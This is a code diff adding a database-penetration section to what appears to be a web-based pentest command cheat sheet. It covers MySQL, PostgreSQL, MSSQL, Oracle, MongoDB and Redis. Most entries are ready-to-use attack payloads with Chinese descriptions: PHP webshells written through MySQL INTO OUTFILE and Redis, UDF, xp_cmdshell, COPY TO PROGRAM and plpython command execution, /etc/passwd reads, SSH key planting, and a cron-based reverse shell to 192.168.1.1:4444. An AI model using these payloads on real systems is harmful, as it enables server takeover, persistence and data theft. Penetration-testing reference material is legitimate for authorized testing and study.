@@ -376,6 +376,290 @@ const commandData = ref({
         tags: ['Windows', '防火墙']
       }
     ]
+  },
+  '数据库渗透': {
+    'MySQL': [
+      {
+        title: '连接MySQL',
+        code: 'mysql -h 192.168.1.100 -u root -p',
+        description: '连接到MySQL数据库',
+        tags: ['MySQL', '连接']
+      },
+      {
+        title: '枚举数据库',
+        code: 'SHOW DATABASES;',
+        description: '列出所有数据库',
+        tags: ['MySQL', '枚举']
+      },
+      {
+        title: '枚举表',
+        code: 'USE database_name; SHOW TABLES;',
+        description: '列出指定数据库中的表',
+        tags: ['MySQL', '枚举']
+      },
+      {
+        title: '枚举列',
+        code: 'DESCRIBE table_name;',
+        description: '查看表结构',
+        tags: ['MySQL', '枚举']
+      },
+      {
+        title: '读取文件',
+        code: "SELECT LOAD_FILE('/etc/passwd');",
+        description: '使用MySQL读取系统文件',
+        tags: ['MySQL', '文件读取']
+      },
+      {
+        title: '写入文件',
+        code: "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
+        description: '写入WebShell到Web目录',
+        tags: ['MySQL', '文件写入', 'WebShell']
+      },
+      {
+        title: 'UDF提权',
+        code: 'CREATE FUNCTION sys_exec RETURNS STRING SONAME "lib_mysqludf_sys.so";',
+        description: '创建用户定义函数执行系统命令',
+        tags: ['MySQL', 'UDF', '提权']
+      },
+      {
+        title: '执行系统命令',
+        code: 'SELECT sys_exec("whoami");',
+        description: '通过UDF执行系统命令',
+        tags: ['MySQL', 'UDF', '命令执行']
+      },
+      {
+        title: '获取MySQL版本',
+        code: 'SELECT VERSION();',
+        description: '获取MySQL版本信息',
+        tags: ['MySQL', '信息收集']
+      },
+      {
+        title: '获取当前用户',
+        code: 'SELECT USER();',
+        description: '获取当前MySQL用户',
+        tags: ['MySQL', '信息收集']
+      }
+    ],
+    'PostgreSQL': [
+      {
+        title: '连接PostgreSQL',
+        code: 'psql -h 192.168.1.100 -U postgres -d postgres',
+        description: '连接到PostgreSQL数据库',
+        tags: ['PostgreSQL', '连接']
+      },
+      {
+        title: '枚举数据库',
+        code: '\\l',
+        description: '列出所有数据库',
+        tags: ['PostgreSQL', '枚举']
+      },
+      {
+        title: '枚举表',
+        code: '\\dt',
+        description: '列出当前数据库中的表',
+        tags: ['PostgreSQL', '枚举']
+      },
+      {
+        title: '获取版本信息',
+        code: 'SELECT version();',
+        description: '获取PostgreSQL版本',
+        tags: ['PostgreSQL', '信息收集']
+      },
+      {
+        title: '获取当前用户',
+        code: 'SELECT current_user;',
+        description: '获取当前PostgreSQL用户',
+        tags: ['PostgreSQL', '信息收集']
+      },
+      {
+        title: '读取文件',
+        code: "COPY (SELECT '') TO '/tmp/test.txt';",
+        description: '使用COPY命令读取文件',
+        tags: ['PostgreSQL', '文件操作']
+      },
+      {
+        title: '命令执行',
+        code: "COPY (SELECT '') TO PROGRAM 'whoami';",
+        description: '通过COPY TO PROGRAM执行命令',
+        tags: ['PostgreSQL', '命令执行']
+      },
+      {
+        title: '创建扩展',
+        code: 'CREATE EXTENSION IF NOT EXISTS plpythonu;',
+        description: '创建Python扩展',
+        tags: ['PostgreSQL', '扩展']
+      },
+      {
+        title: 'Python命令执行',
+        code: "CREATE OR REPLACE FUNCTION exec(cmd text) RETURNS text AS $$ import os; return os.popen(cmd).read() $$ LANGUAGE plpythonu;",
+        description: '创建Python函数执行系统命令',
+        tags: ['PostgreSQL', 'Python', '命令执行']
+      }
+    ],
+    'MSSQL': [
+      {
+        title: '连接MSSQL',
+        code: 'sqlcmd -S 192.168.1.100 -U sa -P password',
+        description: '连接到MSSQL数据库',
+        tags: ['MSSQL', '连接']
+      },
+      {
+        title: '枚举数据库',
+        code: 'SELECT name FROM sys.databases;',
+        description: '列出所有数据库',
+        tags: ['MSSQL', '枚举']
+      },
+      {
+        title: '枚举表',
+        code: 'SELECT table_name FROM information_schema.tables;',
+        description: '列出当前数据库中的表',
+        tags: ['MSSQL', '枚举']
+      },
+      {
+        title: '启用xp_cmdshell',
+        code: "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
+        description: '启用xp_cmdshell存储过程',
+        tags: ['MSSQL', 'xp_cmdshell']
+      },
+      {
+        title: '执行系统命令',
+        code: "EXEC xp_cmdshell 'whoami';",
+        description: '通过xp_cmdshell执行系统命令',
+        tags: ['MSSQL', 'xp_cmdshell', '命令执行']
+      },
+      {
+        title: '获取MSSQL版本',
+        code: 'SELECT @@VERSION;',
+        description: '获取MSSQL版本信息',
+        tags: ['MSSQL', '信息收集']
+      },
+      {
+        title: '获取当前用户',
+        code: 'SELECT SUSER_NAME();',
+        description: '获取当前MSSQL用户',
+        tags: ['MSSQL', '信息收集']
+      },
+      {
+        title: '读取文件',
+        code: "SELECT * FROM OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) AS Contents;",
+        description: '使用OPENROWSET读取文件',
+        tags: ['MSSQL', '文件读取']
+      }
+    ],
+    'Oracle': [
+      {
+        title: '连接Oracle',
+        code: 'sqlplus user/password@192.168.1.100:1521/XE',
+        description: '连接到Oracle数据库',
+        tags: ['Oracle', '连接']
+      },
+      {
+        title: '枚举表空间',
+        code: 'SELECT tablespace_name FROM dba_tablespaces;',
+        description: '列出所有表空间',
+        tags: ['Oracle', '枚举']
+      },
+      {
+        title: '枚举表',
+        code: 'SELECT table_name FROM all_tables;',
+        description: '列出所有表',
+        tags: ['Oracle', '枚举']
+      },
+      {
+        title: '获取Oracle版本',
+        code: 'SELECT banner FROM v$version;',
+        description: '获取Oracle版本信息',
+        tags: ['Oracle', '信息收集']
+      },
+      {
+        title: '获取当前用户',
+        code: 'SELECT user FROM dual;',
+        description: '获取当前Oracle用户',
+        tags: ['Oracle', '信息收集']
+      },
+      {
+        title: 'Java命令执行',
+        code: "SELECT dbms_java.runjava('java.lang.Runtime.getRuntime().exec(\"whoami\")') FROM dual;",
+        description: '通过Java执行系统命令',
+        tags: ['Oracle', 'Java', '命令执行']
+      }
+    ],
+    'MongoDB': [
+      {
+        title: '连接MongoDB',
+        code: 'mongo 192.168.1.100:27017',
+        description: '连接到MongoDB数据库',
+        tags: ['MongoDB', '连接']
+      },
+      {
+        title: '枚举数据库',
+        code: 'show dbs',
+        description: '列出所有数据库',
+        tags: ['MongoDB', '枚举']
+      },
+      {
+        title: '枚举集合',
+        code: 'show collections',
+        description: '列出当前数据库中的集合',
+        tags: ['MongoDB', '枚举']
+      },
+      {
+        title: '获取MongoDB版本',
+        code: 'db.version()',
+        description: '获取MongoDB版本信息',
+        tags: ['MongoDB', '信息收集']
+      },
+      {
+        title: '执行JavaScript',
+        code: 'db.eval("return 1+1")',
+        description: '执行JavaScript代码',
+        tags: ['MongoDB', 'JavaScript']
+      },
+      {
+        title: '命令执行',
+        code: 'db.eval("var proc = new java.lang.ProcessBuilder([\\"whoami\\"]).start();")',
+        description: '通过JavaScript执行系统命令',
+        tags: ['MongoDB', 'JavaScript', '命令执行']
+      }
+    ],
+    'Redis': [
+      {
+        title: '连接Redis',
+        code: 'redis-cli -h 192.168.1.100 -p 6379',
+        description: '连接到Redis数据库',
+        tags: ['Redis', '连接']
+      },
+      {
+        title: '获取Redis信息',
+        code: 'INFO',
+        description: '获取Redis服务器信息',
+        tags: ['Redis', '信息收集']
+      },
+      {
+        title: '枚举所有键',
+        code: 'KEYS *',
+        description: '列出所有键',
+        tags: ['Redis', '枚举']
+      },
+      {
+        title: '写入文件',
+        code: 'SET mykey "<?php system($_GET[\\"cmd\\"]); ?>"\nCONFIG SET dir /var/www/html\nCONFIG SET dbfilename shell.php\nSAVE',
+        description: '通过Redis写入WebShell',
+        tags: ['Redis', '文件写入', 'WebShell']
+      },
+      {
+        title: 'SSH公钥写入',
+        code: 'SET mykey "ssh-rsa AAAA..."\nCONFIG SET dir /root/.ssh\nCONFIG SET dbfilename authorized_keys\nSAVE',
+        description: '写入SSH公钥进行免密登录',
+        tags: ['Redis', 'SSH', '权限维持']
+      },
+      {
+        title: 'Crontab任务',
+        code: 'SET mykey "\\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.1.1/4444 0>&1\\n"\nCONFIG SET dir /var/spool/cron\nCONFIG SET dbfilename root\nSAVE',
+        description: '写入定时任务反弹Shell',
+        tags: ['Redis', 'Crontab', '反弹Shell']
+      }
+    ]
   }
 })
 
